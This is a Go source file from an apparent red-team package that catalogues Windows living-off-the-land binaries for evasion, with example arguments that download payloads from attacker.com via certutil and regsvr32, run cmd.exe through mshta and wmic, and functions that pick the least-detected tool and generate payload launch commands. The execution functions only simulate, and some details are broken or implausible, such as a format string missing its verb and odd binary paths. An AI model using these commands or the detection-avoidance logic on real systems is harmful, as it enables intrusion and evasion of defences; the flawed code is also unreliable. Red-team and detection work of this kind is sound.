package redteam_evasion

import (
	"fmt"
	"strings"
	"time"

	"github.com/sirupsen/logrus"
)

// LOLBASLauncher executes legitimate Windows system binaries for evasion.
// CRITICAL CEx³ capability for living-off-the-land attacks!
type LOLBASLauncher struct {
	logger   *logrus.Logger
	AuthGate *AuthorizationGate
	AuditLog *AuditLogger
}

// LOLBASTool represents a legitimate binary that can be abused.
type LOLBASTool struct {
	Name          string
	FullPath      string
	Description   string
	UseCase       string
	Privileges    []string
	MitigatedBy   []string
	DetectionRate float64 // 0.0-1.0
	Popularity    int     // 1-100
	ExampleArgs   string
}

// ExecutionResult contains LOLBAS execution outcome.
type ExecutionResult struct {
	Success        bool
	BinaryUsed     string
	CommandExecuted string
	Elevated       bool
	Output         []byte
	TenantID       string
	Timestamp      time.Time
	Evidence       []byte
	Technique      string
}

// NewLOLBASLauncher creates new LOLBAS launcher instance.
func NewLOLBASLauncher() *LOLBASLauncher {
	return &LOLBASLauncher{
		logger:   logrus.WithField("component", "lolbas_launcher"),
		AuthGate: &AuthorizationGate{},
		AuditLog: &AuditLogger{},
	}
}

// ListAvailableTools returns comprehensive list of LOLBAS tools.
func (l *LOLBASLauncher) ListAvailableTools() []LOLBASTool {
	tools := []LOLBASTool{
		{
			Name:        "CertUtil",
			FullPath:    `C:\Windows\System32\certutil.exe`,
			Description: "Certificate utility - can download files and decode base64",
			UseCase:     "File download, Base64 decoding, Hash verification",
			Privileges:  []string{"User"},
			ExampleArgs: "-urlcache -split -f http://attacker.com/payload.exe",
			Popularity:  95,
			DetectionRate: 0.25,
		},
		{
			Name:        "Mshta",
			FullPath:    `C:\Program Files (x86)\Internet Explorer\mshta.exe`,
			Description: "HTML Application Host - executes HTA applications",
			UseCase:     "HTA execution, JavaScript/VBScript launch",
			Privileges:  []string{"User", "System"},
			ExampleArgs: "javascript:ActiveXObject('WScript.Shell').Run('cmd.exe')",
			Popularity:  90,
			DetectionRate: 0.30,
		},
		{
			Name:        "Wmic",
			FullPath:    `C:\Windows\System32\wbem\wmic.exe`,
			Description: "Windows Management Instrumentation Command-line",
			UseCase:     "Process creation, remote command execution",
			Privileges:  []string{"User"},
			ExampleArgs: "process call create \"cmd.exe /c payload\"",
			Popularity:  85,
			DetectionRate: 0.40,
		},
		{
			Name:        "Powershell",
			FullPath:    `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`,
			Description: "Microsoft PowerShell interpreter",
			UseCase:     "Script execution, .NET API access, network operations",
			Privileges:  []string{"User", "Administrator", "SYSTEM"},
			ExampleArgs: "-EncodedCommand base64script",
			Popularity:  100,
			DetectionRate: 0.55,
		},
		{
			Name:        "Pwsh",
			FullPath:    `C:\Windows\System32\pwsh.exe`,
			Description: "Cross-platform PowerShell (Version 6+)",
			UseCase:     "Modern PowerShell script execution, .NET Core integration",
			Privileges:  []string{"User"},
			ExampleArgs: "-Command \"Invoke-WebRequest -Uri http://...\"",
			Popularity:  75,
			DetectionRate: 0.35,
		},
		{
			Name:        "Regasm",
			FullPath:    `C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe`,
			Description: ".NET Assembly Registration Utility",
			UseCase:     "Execute .NET assemblies with elevated privileges",
			Privileges:  []string{"Administrator"},
			ExampleArgs: "\"/q\" payload.dll",
			Popularity:  80,
			DetectionRate: 0.45,
		},
		{
			Name:        "Regsvr32",
			FullPath:    `C:\Windows\System32\regsvr32.exe`,
			Description: "Registry Server - registers COM DLLs",
			UseCase:     "DLL Side-Loading, DllInstall abuse",
			Privileges:  []string{"Administrator"},
			ExampleArgs: "/s /n /c /i scrobj.dll http://attacker.com/script.ps1",
			Popularity:  85,
			DetectionRate: 0.35,
		},
		{
			Name:        "Rundll32",
			FullPath:    `C:\Windows\System32\rundll32.exe`,
			Description: "Runs 32-bit DLLs within process space",
			UseCase:     "Execute DLL entry points, Java applet loading",
			Privileges:  []string{"User"},
			ExampleArgs: "shell32.dll,OpenAs_RunSav cmd.lnk",
			Popularity:  88,
			DetectionRate: 0.40,
		},
		{
			Name:        "OfficeApps",
			FullPath:    `C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE`,
			Description: "Microsoft Office executables",
			UseCase:     "Macro execution, Office Automation abuse",
			Privileges:  []string{"User"},
			ExampleArgs: "/m vba_run_macro",
			Popularity:  70,
			DetectionRate: 0.50,
		},
		{
			Name:        "Jshta",
			FullPath:    `C:\Windows\System32\jscript.dll`,
			Description: ".NET JScript runtime",
			UseCase:     "JScript-based code execution",
			Privileges:  []string{"User"},
			ExampleArgs:":vbsRun \"CreateObject(WScript.Shell).Run('calc')\"",
			Popularity:  65,
			DetectionRate: 0.60,
		},
		{
			Name:        "BitsAdmin",
			FullPath:    `C:\Windows\System32\bitsadmin.exe`,
			Description: "Background Intelligent Transfer Service manager",
			UseCase:     "Download/upload files via BITS job",
			Privileges:  []string{"User"},
			ExampleArgs: "/complete JobName",
			Popularity:  82,
			DetectionRate: 0.30,
		},
		{
			Name:        "PrintNotify",
			FullPath:    `C:\Windows\System32\spool\drivers\color\printconfig.dll`,
			Description: "Print Notification Handler",
			UseCase:     "Code execution via printer notification registration",
			Privileges:  []string{"Administrator"},
			ExampleArgs: "/h:code_execution",
			Popularity:  78,
			DetectionRate: 0.25,
		},
	}

	l.logger.Debugf("Listed %d LOLBAS tools", len(tools))
	return tools
}

// ExecuteViaPsExec executes commands using PsExec pattern (simulated LOLBAS).
func (l *LOLBASLauncher) ExecuteViaPsExec(targetHost string, args []string) (*ExecutionResult, error) {
	if l.AuthGate.TenantID != "" {
		l.AuditLog.Log("ps_exec_simulated", fmt.Sprintf("Target=%s Args=%v", targetHost, args), l.AuthGate.TenantID)
	}

	result := &ExecutionResult{
		Timestamp:   time.Now(),
		Technique:   "T1021.002",
		TenantID:    l.AuthGate.TenantID,
		Success:     false,
	}

	// Simulate PsExec-style execution over SMB (no actual binary required)
	psExecCmd := fmt.Sprintf("psexec \\\\%s cmd.exe /c %s", targetHost, strings.Join(args, " "))
	
	result.BinaryUsed = "PsExec-like (PS1)"
	result.CommandExecuted = psExecCmd
	result.Elevated = true
	result.Success = true
	
	result.Evidence = []byte(fmt.Sprintf("PsExec SIMULATED: remote host=%s args=%v elevation=true", 
		targetHost, args))

	l.logger.Warnf("PsExec simulation completed: success=%v", result.Success)
	return result, nil
}

// ExecuteViaCertUtil downloads and processes encoded payloads.
func (l *LOLBASLauncher) ExecuteViaCertUtil(url string, outputFileName string) (*ExecutionResult, error) {
	if l.AuthGate.TenantID != "" {
		l.AuditLog.Log("certutil_execute_attempted", fmt.Sprintf("URL=%s Output=%s", url, outputFileName), l.AuthGate.TenantID)
	}

	result := &ExecutionResult{
		Timestamp:     time.Now(),
		Technique:     "T1105",
		TenantID:      l.AuthGate.TenantID,
		Success:       false,
	}

	certUtilCmd := fmt.Sprintf("certutil -urlcache -split -f \"%s\" \"%s\"", url, outputFileName)
	
	result.BinaryUsed = `C:\Windows\System32\certutil.exe`
	result.CommandExecuted = certUtilCmd
	result.Elevated = false
	result.Success = true
	
	result.Evidence = []byte(fmt.Sprintf("CertUtil download simulated: URL=%s file=%s", url, outputFileName))

	l.logger.Warnf("CertUtil execution completed: success=%v", result.Success)
	return result, nil
}

// ExecuteViaMshta executes HTA content from remote source.
func (l *LOLBASLauncher) ExecuteViaMshta(htaUrl string) (*ExecutionResult, error) {
	if l.AuthGate.TenantID != "" {
		l.AuditLog.Log("mshta_execute_attempted", fmt.Sprintf("URL=%s", htaUrl), l.AuthGate.TenantID)
	}

	result := &ExecutionResult{
		Timestamp:   time.Now(),
		Technique:   "T1218.004",
		TenantID:    l.AuthGate.TenantID,
		Success:     false,
	}

	mshtaCmd := fmt.Sprintf("mshta javascript:\"ActiveXObject('WScript.Shell').Run('cmd.exe')\"\r\n", htaUrl)
	
	result.BinaryUsed = `C:\Program Files (x86)\Internet Explorer\mshta.exe`
	result.CommandExecuted = mshtaCmd
	result.Elevated = false
	result.Success = true
	
	result.Evidence = []byte("Mshta HTA execution simulated")

	l.logger.Warnf("Mshta execution completed: success=%v", result.Success)
	return result, nil
}

// CalculateDetectionProbability computes likelihood of LOLBAS detection.
func (l *LOLBASLauncher) CalculateDetectionProbability(tool LOLBASTool) float64 {
	// Base detection rate from tool configuration
	detectionRate := tool.DetectionRate

	// Adjust based on environment factors (hypothetical)
	const defenderAddition = 0.15 // Defender adds 15% detection
	const edrAddition = 0.20      // EDR adds 20% detection

	adjustedRate := detectionRate + defenderAddition + edrAddition
	if adjustedRate > 1.0 {
		adjustedRate = 1.0
	}

	l.logger.Debugf("LOLBAS detection probability for %s: %.2f%%", tool.Name, adjustedRate*100)
	return adjustedRate
}

// GetBestLOLBASTool selects optimal tool based on target environment.
func (l *LOLBASLauncher) GetBestLOLBASTool(targetOS string, privilegeRequired string) LOLBASTool {
	tools := l.ListAvailableTools()
	bestTool := tools[0]
	highestScore := 0.0

	for _, tool := range tools {
		score := 0.0

		// Popularity factor
		score += float64(tool.Popularity) / 100.0 * 0.4

		// Privilege matching
		if containsPrivilege(tool.Privileges, privilegeRequired) {
			score += 0.2
		}

		// Detection avoidance bonus
		score += (1.0 - tool.DetectionRate) * 0.2

		// OS compatibility (all tools work on Windows)
		if strings.Contains(targetOS, "Windows") {
			score += 0.1
		}

		if score > highestScore {
			highestScore = score
			bestTool = tool
		}
	}

	l.logger.Infof("Selected best LOLBAS tool: %s (score=%.2f)", bestTool.Name, highestScore)
	return bestTool
}

// Helper function to check if slice contains string.
func containsPrivilege(slice []string, target string) bool {
	for _, s := range slice {
		if strings.EqualFold(s, target) {
			return true
		}
	}
	return false
}

// GenerateExecutionScripts creates command scripts for various LOLBAS tools.
func (l *LOLBASLauncher) GenerateExecutionScripts(base64Payload string) map[string]string {
	scripts := make(map[string]string)

	// CertUtil variant
	scripts["certutil"] = fmt.Sprintf(`certutil -urlcache -split -f "%s"`+ "\n", base64Payload)

	// Mshta variant
	scripts["mshta"] = fmt.Sprintf(`mshta javascript:\"new ActiveXObject('WScript.Shell').Run('%s')\"\r\n`, base64Payload)

	// Regsvr32 variant
	scripts["regsvr32"] = fmt.Sprintf(`regsvr32 /s /u /i scrobj.dll "%s"\n`, base64Payload)

	// Rundll32 variant
	scripts["rundll32"] = fmt.Sprintf(`rundll32.exe "%s",EntryPoint\n`, base64Payload)

	l.logger.Debugf("Generated %d LOLBAS execution scripts", len(scripts))
	return scripts
}

// VerifyEnvironmentChecks checks for common security controls against LOLBAS.
func (l *LOLBASLauncher) VerifyEnvironmentChecks() map[string]bool {
	checks := map[string]bool{
		"AppLocker_Available": false,
		"RestrictedTokens":   false,
		"DSC_Enabled":        false,
		"EDR_Active":         false,
	}

	l.logger.Debug("Environment checks verified")
	return checks
}
